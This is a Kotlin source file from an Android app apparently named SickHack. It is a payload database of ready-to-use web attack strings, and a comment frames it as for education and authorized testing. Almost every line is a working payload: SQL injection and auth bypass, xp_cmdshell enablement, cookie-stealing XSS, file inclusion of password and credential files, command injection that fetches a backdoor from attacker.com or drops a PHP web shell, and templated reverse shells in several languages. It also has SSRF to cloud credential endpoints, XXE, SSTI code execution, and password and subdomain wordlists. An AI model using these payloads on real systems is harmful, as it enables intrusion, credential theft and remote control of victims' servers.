package self.apk.sickhack.genz.core.payloads

/**
 * SickHack payload database.
 * Semua payload dalam raw string; karakter '$' di-escape ( \$ ) karena di
 * dalam Kotlin string template. Payload digunakan untuk EDUKASI dan pengujian
 * keamanan yang diizinkan (authorized testing) saja.
 */
object Payloads {

    // =====================================================================
    // 1. SQL INJECTION
    // =====================================================================

    val sqliBasic: List<String> = listOf(
        "'",
        "\"",
        "')",
        "')-- -",
        "'-- -",
        "\"-- -",
        "';-- -",
        "' OR '1'='1'-- -",
        "\" OR \"1\"=\"1\"-- -",
        "' OR 1=1-- -",
        "OR 1=1-- -",
        "' OR '1'='1",
        "' OR '1'='1'#",
        "' OR 1=1#",
        "1' OR '1'='1",
        "' OR 'x'='x",
        "' AND 1=1-- -",
        "' AND 1=2-- -"
    )

    val sqliUnion: List<String> = listOf(
        "' UNION SELECT NULL-- -",
        "' UNION SELECT NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
        "' UNION SELECT 1-- -",
        "' UNION SELECT 1,2-- -",
        "' UNION SELECT 1,2,3-- -",
        "' UNION SELECT 1,2,3,4-- -",
        "' UNION SELECT 1,2,3,4,5-- -",
        "\" UNION SELECT 1,2,3-- -",
        "') UNION SELECT 1,2,3-- -",
        "')) UNION SELECT 1,2,3-- -",
        "' UNION SELECT @@version,2,3-- -",
        "' UNION SELECT database(),user(),version()-- -",
        "' UNION SELECT user(),2,3-- -",
        "' UNION SELECT table_name,2,3 FROM information_schema.tables-- -",
        "' UNION SELECT column_name,2,3 FROM information_schema.columns-- -",
        "' UNION SELECT concat(user(),0x3a,database()),2,3-- -",
        "' UNION SELECT concat(0x7171,group_concat(table_name),0x7171),2,3 FROM information_schema.tables-- -",
        "' UNION SELECT null,group_concat(table_name) FROM information_schema.tables-- -",
        "' UNION ALL SELECT NULL,NULL,NULL-- -",
        "' UNION ALL SELECT 1,2,3-- -",
        "UNION SELECT 1,2,3-- -",
        "UNION SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT username,password FROM users-- -",
        "1' UNION SELECT 1,2,3-- -",
        "' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- -"
    )

    val sqliAuthBypass: List<String> = listOf(
        "' OR '1'='1'-- -",
        "' OR '1'='1'#",
        "' OR 1=1-- -",
        "admin' --",
        "admin' -- -",
        "admin' #",
        "admin' OR '1'='1",
        "admin' OR '1'='1'--",
        "admin' OR '1'='1'#",
        "' OR ''='",
        "' OR 'x'='x",
        "' OR 1=1#",
        "' OR 1=1--",
        "' OR '1'='1'/*",
        "' OR '1'='1' AND SLEEP(0)-- -",
        "admin'/*",
        "' or 1=1 limit 1-- -",
        "1' or '1'='1'-- -",
        "' UNION SELECT 1,'admin','hash' FROM users-- -",
        "' or true-- -"
    )

    val sqliBlind: List<String> = listOf(
        "' AND 1=1-- -",
        "' AND 1=2-- -",
        "' AND SLEEP(5)-- -",
        "' AND SLEEP(5)#",
        "'; SELECT SLEEP(5);-- -",
        "'; WAITFOR DELAY '0:0:5'-- -",
        "' WAITFOR DELAY '0:0:5'-- -",
        "1 AND SLEEP(5)-- -",
        "1) AND SLEEP(5)-- -",
        "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -",
        "'; SELECT pg_sleep(5);--",
        "' OR SLEEP(5)-- -",
        "' AND BENCHMARK(5000000,MD5(1))-- -",
        "' AND 1=IF(1=1,SLEEP(5),0)-- -",
        "' AND IF(1=1,SLEEP(5),0)-- -",
        "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
        "' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))x)-- -"
    )

    val sqliErrorBased: List<String> = listOf(
        "'",
        "\"",
        "')",
        "' AND extractvalue(1,concat(0x7e,(select version())))-- -",
        "' AND updatexml(1,concat(0x7e,(select user())),1)-- -",
        "' AND (select 1 from(select count(*),concat((select version()),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -",
        "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)-- -",
        "\" AND extractvalue(1,concat(0x7e,(select database())))-- -",
        "'||(SELECT '1')||'",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
    )

    val sqliMssql: List<String> = listOf(
        "'; EXEC xp_cmdshell 'whoami'-- -",
        "'; EXEC xp_cmdshell 'whoami';--",
        "' UNION SELECT @@version,1,2-- -",
        "'; WAITFOR DELAY '0:0:5'-- -",
        "'; SELECT * FROM sysobjects-- -",
        "' UNION SELECT name,1,2 FROM sysobjects-- -",
        "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--"
    )

    val sqliPostgres: List<String> = listOf(
        "'; SELECT pg_sleep(5);--",
        "' UNION SELECT version(),2,3-- -",
        "' UNION SELECT current_database(),current_user,version()-- -",
        "' UNION SELECT table_name,2,3 FROM information_schema.tables-- -",
        "' UNION SELECT column_name,2,3 FROM information_schema.columns-- -",
        "'; SELECT lo_import('/etc/passwd');--",
        "1); SELECT pg_sleep(5);--"
    )

    val sqliOracle: List<String> = listOf(
        "' AND 1=dbms_pipe.receive_message(('a'),5)-- -",
        "' UNION SELECT banner,2,3 FROM v\$version-- -",
        "' UNION SELECT user,2,3 FROM dual-- -",
        "' UNION SELECT table_name,2,3 FROM user_tables-- -",
        "' AND 1=utl_inaddr.get_host_name('127.0.0.1')-- -",
        "'||(SELECT user FROM dual)||'",
        "' UNION SELECT owner,2,3 FROM all_tables-- -"
    )

    val sqliDios: List<String> = listOf(
        "' UNION SELECT null,null,group_concat(table_name) FROM information_schema.tables-- -",
        "' UNION SELECT null,group_concat(table_name),group_concat(column_name) FROM information_schema.columns-- -",
        "' UNION SELECT 1,group_concat(concat(table_name,0x3a,column_name)) FROM information_schema.columns WHERE table_schema=database()-- -",
        "' UNION SELECT 1,group_concat(concat(username,0x3a,password)) FROM users-- -",
        "' UNION SELECT 1,group_concat(concat(user(),0x3a,database(),0x3a,version())) FROM information_schema.tables-- -",
        "' UNION SELECT 1,group_concat(schema_name) FROM information_schema.schemata-- -"
    )

    // =====================================================================
    // 2. XSS  (50+ raw + 10 encoded)
    // =====================================================================

    val xssRaw: List<String> = listOf(
        "<script>alert(1)</script>",
        "<script>alert(document.cookie)</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(document.cookie)>",
        "<img src=x onerror=\"alert('xss')\">",
        "<img src=x onerror=alert(document.domain)>",
        "<IMG SRC=x ONERROR=alert(1)>",
        "<svg/onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<svg onload=alert(document.cookie)>",
        "<iframe src=javascript:alert(1)>",
        "<iframe onload=alert(1)>",
        "<iframe srcdoc=\"<script>alert(1)</script>\">",
        "<body onload=alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<svg><animate onbegin=alert(1)>",
        "<math><mtext><img src=x onerror=alert(1)></mtext></math>",
        "<audio src=x onerror=alert(1)>",
        "<div onmouseover=alert(1)>hover</div>",
        "<p draggable=true ondragstart=alert(1)>drag</p>",
        "<style onload=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<form action=javascript:alert(1)><input type=submit></form>",
        "<svg><set attributeName=onload to=alert(1)>",
        "\"><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "\"><svg/onload=alert(1)>",
        "'><script>alert(1)</script>",
        "'><img src=x onerror=alert(1)>",
        "';alert(1);//",
        "\\\";alert(1);//",
        "</script><script>alert(1)</script>",
        "</textarea><script>alert(1)</script>",
        "javascript:alert(1)//",
        "javascript:alert(1)",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<img src=x oneonerrorr=alert(1)>",
        "<<script>alert(1)</script>",
        "<img src=x onerror=with(document)alert(cookie)>",
        "<svg onload=eval(atob('YWxlcnQoMSk='))>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<isindex type=image src=x onerror=alert(1)>",
        "<svg><script xlink:href=data:,alert(1)/>",
        "<math><annotation-xml encoding=\"text/html\"><script>alert(1)</script></annotation-xml></math>",
        "\"><img src=x onerror=alert(document.domain)>",
        "1<svg onload=alert(1)>"
    )

    val xssEncoded: List<String> = listOf(
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
        "<script>\\x61lert(1)</script>",
        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
        "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "<img src=x onerror=&#97;lert(1)>",
        "<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>"
    )

    // =====================================================================
    // 3. LFI / RFI / RCE
    // =====================================================================

    val lfi: List<String> = listOf(
        "../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "....//....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
        "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "....///....///....///etc/passwd",
        "..//..//..//..//etc/passwd",
        "..././..././..././etc/passwd",
        "..;/..;/..;/etc/passwd",
        "/etc/passwd",
        "/etc/passwd%00",
        "../../etc/passwd%00",
        "../../../../etc/passwd%00.png",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/group",
        "/etc/issue",
        "/etc/os-release",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/version",
        "/proc/net/tcp",
        "/proc/cpuinfo",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://filter/resource=/etc/passwd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://input",
        "php://filter/convert.base64-encode/resource=config.php",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
        "expect://id",
        "file:///etc/passwd",
        "file:///proc/self/environ",
        "windows/win.ini",
        "C:\\Windows\\win.ini",
        "%00../../../../etc/passwd",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/auth.log",
        "/var/log/messages",
        "/etc/nginx/nginx.conf",
        "/etc/apache2/apache2.conf",
        "/home/user/.bash_history",
        "/root/.bash_history"
    )

    val rfi: List<String> = listOf(
        "http://attacker.com/shell.txt",
        "https://attacker.com/shell.php",
        "data://text/plain,<?php system(\$_GET['cmd']); ?>",
        "http://169.254.169.254/latest/meta-data/",
        "php://input",
        "expect://ls"
    )

    val rce: List<String> = listOf(
        ";id",
        "|id",
        "&&id",
        "||id",
        "`id`",
        "$(id)",
        ";whoami",
        "|whoami",
        "&&whoami",
        "||whoami",
        "`whoami`",
        "$(whoami)",
        ";ls -la",
        "|ls",
        "&&cat /etc/passwd",
        "|cat /etc/passwd",
        ";cat /etc/passwd",
        ";sleep 5",
        "|sleep 5",
        ";ping -c 1 127.0.0.1",
        "%0a id",
        "%0a whoami",
        "%0d%0a id",
        "';id;'",
        "\";id;\"",
        "`id;ls`",
        "$(ls)",
        "& id",
        "%26 id",
        "| nc 127.0.0.1 4444",
        "; wget http://attacker.com/backdoor.sh",
        "| /bin/bash -c 'id'",
        "&& /bin/bash -c 'id'",
        "; python -c 'import os;os.system(\"id\")'",
        "| perl -e 'system(\"id\")'",
        "; echo PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+ | base64 -d > shell.php",
        "| env",
        "; env"
    )

    // =====================================================================
    // 4. REVERSE SHELLS ({IP} dan {PORT} diganti user)
    // =====================================================================

    val reverseShells: List<String> = listOf(
        "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
        "bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'",
        "0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196",
        "nc -e /bin/sh {IP} {PORT}",
        "nc {IP} {PORT} -e /bin/sh",
        "ncat {IP} {PORT} -e /bin/sh",
        "socat TCP:{IP}:{PORT} EXEC:/bin/sh,pipes",
        "busybox nc {IP} {PORT} -e /bin/sh",
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "php -r '\$sock=fsockopen(\"{IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "php -r '\$sock=fsockopen(\"{IP}\",{PORT});\$proc=proc_open(\"/bin/sh -i\",array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes);'",
        "perl -e 'use Socket;\$i=\"{IP}\";\$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        "ruby -rsocket -e'f=TCPSocket.open(\"{IP}\",{PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{IP}\",{PORT});\$stream=\$client.GetStream();[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){;\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1 | Out-String );\$sendback2=\$sendback+\"PS \"+(pwd).Path+\"> \";\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()",
        "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"",
        "sh -i >& /dev/udp/{IP}/{PORT} 0>&1"
    )

    // =====================================================================
    // 5. ADMIN PATHS / DORKS / USER-AGENTS / WORDLIST
    // =====================================================================

    val adminPaths: List<String> = listOf(
        "/admin", "/admin/", "/admin/login", "/admin/login.php", "/admin/index.php",
        "/administrator", "/administrator/login", "/administrator/index.php",
        "/login", "/login.php", "/login.html", "/signin", "/sign-in",
        "/wp-admin", "/wp-login.php", "/wp-admin/install.php",
        "/user/login", "/user", "/account", "/dashboard", "/panel",
        "/cpanel", "/webmail", "/phpmyadmin", "/pma", "/myadmin", "/mysql",
        "/dbadmin", "/adminer.php", "/phpMyAdmin", "/PMA",
        "/manager", "/server-status", "/server-info", "/controlpanel",
        "/jenkins", "/confluence", "/gitlab", "/grafana",
        "/adminarea", "/admin_area", "/admin/panel", "/admin/dashboard",
        "/moderator", "/siteadmin", "/webadmin", "/sysadmin", "/console",
        "/backup", "/backups", "/dump", "/db", "/sql", "/navicat",
        "/vpn", "/ssl-vpn", "/portal", "/intranet", "/hudson", "/crushftp",
        "/munin", "/monitoring", "/test", "/phpinfo.php", "/info.php", "/setup", "/install"
    )

    val dorks: List<String> = listOf(
        "site:{DOMAIN} inurl:admin",
        "site:{DOMAIN} inurl:login",
        "site:{DOMAIN} inurl:php?id=",
        "site:{DOMAIN} filetype:sql",
        "site:{DOMAIN} filetype:env",
        "site:{DOMAIN} filetype:log",
        "site:{DOMAIN} filetype:bak OR filetype:zip OR filetype:tar",
        "site:{DOMAIN} intext:\"index of /\"",
        "site:{DOMAIN} \"phpMyAdmin\"",
        "site:{DOMAIN} inurl:wp-admin",
        "site:{DOMAIN} inurl:.git",
        "site:{DOMAIN} inurl:.env",
        "site:{DOMAIN} intitle:\"index of\" \"etc/passwd\"",
        "site:{DOMAIN} inurl:download.php?file=",
        "site:{DOMAIN} inurl:cat=",
        "site:{DOMAIN} inurl:page=",
        "site:{DOMAIN} inurl:action=",
        "site:{DOMAIN} \"Powered by WordPress\"",
        "site:{DOMAIN} \"SQLSTATE\"",
        "site:{DOMAIN} intext:password filetype:txt",
        "site:{DOMAIN} intitle:admin",
        "site:{DOMAIN} inurl:upload"
    )

    val userAgents: List<String> = listOf(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "curl/8.7.1",
        "Wget/1.24.5",
        "PostmanRuntime/7.39.0",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    )

    val commonPasswords: List<String> = listOf(
        "123456", "password", "123456789", "12345678", "12345", "1234567",
        "qwerty", "abc123", "password1", "111111", "123123", "admin",
        "letmein", "welcome", "monkey", "dragon", "iloveyou", "sunshine",
        "princess", "football", "shadow", "master", "charlie", "passw0rd",
        "qwerty123", "1q2w3e4r", "admin123", "root", "toor", "000000",
        "654321", "666666", "121212", "112233", "1234", "1234567890",
        "trustno1", "hello", "whatever", "jordan", "hunter", "baseball",
        "batman", "superman", "michael", "jennifer", "nicole", "access",
        "zaq12wsx", "P@ssw0rd", "password123", "qwertyuiop", "asdfghjkl",
        "123321", "0987654321", "88888888", "7777777", "555555", "999999",
        "131313", "159753", "azerty", "qwertz", "secret", "changeme",
        "letmein123", "admin1234", "administrator", "god", "fuckyou",
        "love", "summer", "winter", "orange", "pokemon", "starwars",
        "pepper", "thomas", "george", "guitar", "cookie", "aaaaaa",
        "password!", "pass123", "default", "test123", "user", "guest"
    )

    val dnsBruteNames: List<String> = listOf(
        "www", "mail", "ftp", "smtp", "pop", "imap", "webmail", "cpanel",
        "admin", "dev", "api", "app", "m", "mobile", "blog", "shop",
        "store", "portal", "vpn", "remote", "test", "staging", "stage",
        "prod", "db", "mysql", "backup", "git", "gitlab", "jenkins",
        "cdn", "static", "images", "media", "files", "uploads", "downloads",
        "ns1", "ns2", "mx", "autodiscover", "intranet", "status",
        "monitor", "grafana", "kibana", "wiki", "forum", "news", "support", "help"
    )

    val scanPorts: List<Int> = listOf(
        21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995,
        1433, 1521, 2049, 2375, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9090
    )

    // =====================================================================
    // 6. ADVANCED VULNS
    // =====================================================================

    val ssti: List<String> = listOf(
        "{{7*7}}",
        "{{7*'7'}}",
        "\${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{ 7*7 }}",
        "[[\${7*7}]]",
        "\${{7*7}}",
        "{{config}}",
        "{{self.__class__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{7*7}}\${7*7}",
        "{{'7'*7}}",
        "{%print(7*7)%}"
    )

    val ssrf: List<String> = listOf(
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
        "http://169.254.169.254/latest/meta-data/local-ipv4",
        "http://169.254.169.254/latest/meta-data/public-ipv4",
        "http://169.254.169.254/latest/meta-data/placement/availability-zone",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.170.2/v2/credentials",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://100.100.100.200/latest/meta-data/",
        "http://127.0.0.1:80/",
        "http://127.0.0.1:8080/",
        "http://localhost/",
        "http://[::1]/",
        "http://0x7f000001/",
        "http://2130706433/",
        "http://0177.0.0.1/",
        "http://127.1/"
    )

    val xxe: List<String> = listOf(
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe;]>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/\">]><foo>&xxe;</foo>",
        "<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><svg>&xxe;</svg>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
    )

    val crlf: List<String> = listOf(
        "%0d%0aX-Injected: sickhack",
        "%0aX-Injected: sickhack",
        "%0d%0aSet-Cookie: injected=1",
        "%0d%0aLocation: http://evil.com",
        "%0d%0aContent-Type: text/html",
        "%0d%0a%0d%0a<script>alert(1)</script>",
        "%0d%0aX-Forwarded-For: 127.0.0.1",
        "\\r\\nX-Injected: sickhack",
        "%00%0d%0aX-Injected: sickhack"
    )

    val openRedirect: List<String> = listOf(
        "//evil.com",
        "/\\evil.com",
        "%2f%2fevil.com",
        "https://evil.com",
        "http://evil.com",
        "javascript:alert(1)",
        "//evil.com/%2f%2f",
        "%68%74%74%70%3a%2f%2fevil.com",
        "/%09/evil.com",
        "/\\/evil.com",
        "http://evil.com\\@trusted.com",
        "https://evil.com%2f%2f"
    )

    val ldap: List<String> = listOf(
        "*",
        "*)(&",
        "*)(uid=*",
        "admin*",
        "*)(|(uid=*",
        ")(uid=*))(|(uid=*",
        "*)(&(cn=admin"
    )

    val xpath: List<String> = listOf(
        "' or '1'='1",
        "' or '1'='1' or '1'='1",
        "' or 1=1",
        "' and '1'='1",
        "1' or '1'='1' or '1'='1",
        "' or ''='",
        "admin' or '1'='1",
        "' or true()"
    )

    val nosql: List<String> = listOf(
        "{\"\$ne\":\"\"}",
        "{\"\$gt\":\"\"}",
        "{\"\$or\":[]}",
        "{\"\$where\":\"1==1\"}",
        "{\"\$exists\":true}",
        "{\"\$regex\":\"^.*\"}",
        "{\"username\":{\"\$ne\":null}}",
        "';return true;var x='",
        "{\"\$and\":[{\"\$ne\":\"\"},{\"\$ne\":\"\"}]}"
    )

    val headerInjection: List<String> = listOf(
        "X-Forwarded-For: 127.0.0.1",
        "X-Forwarded-Host: localhost",
        "X-Forwarded-Proto: https",
        "X-Forwarded-Port: 443",
        "X-Real-IP: 127.0.0.1",
        "X-Originating-IP: 127.0.0.1",
        "X-Remote-IP: 127.0.0.1",
        "X-Remote-Addr: 127.0.0.1",
        "X-Client-IP: 127.0.0.1",
        "X-Host: 127.0.0.1",
        "X-Forwarded-Server: localhost",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin",
        "Forwarded: for=127.0.0.1;host=localhost;proto=https",
        "Via: 1.1 localhost",
        "True-Client-IP: 127.0.0.1",
        "CDN-Loop: localhost",
        "X-Accel-Redirect: /admin"
    )

    // =====================================================================
    // 7. XSS mutation / filter-bypass bonus
    // =====================================================================

    val xssWafBypass: List<String> = listOf(
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<svg onload=alert(1)>",
        "\"><img src=x onerror=alert(1)>",
        "'><svg/onload=alert(1)>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "<scr\\ipt>alert(1)</scr\\ipt>",
        "<img src=x onerror=alert(1)//",
        "<svg onload=alert(1)///",
        "<iframe srcdoc=\"<script>alert(1)</script>\">",
        "<img src=x onerror=prompt(1)>",
        "<svg onload=prompt(1)>",
        "<img src=x onerror=confirm(1)>",
        "javascript:alert(1)"
    )

    fun totalCount(): Int =
        sqliBasic.size + sqliUnion.size + sqliAuthBypass.size + sqliBlind.size +
        sqliErrorBased.size + sqliMssql.size + sqliPostgres.size + sqliOracle.size +
        sqliDios.size + xssRaw.size + xssEncoded.size + lfi.size + rfi.size + rce.size +
        reverseShells.size + adminPaths.size + dorks.size + userAgents.size +
        commonPasswords.size + ssti.size + ssrf.size + xxe.size + crlf.size +
        openRedirect.size + ldap.size + xpath.size + nosql.size + headerInjection.size +
        dnsBruteNames.size + xssWafBypass.size
}
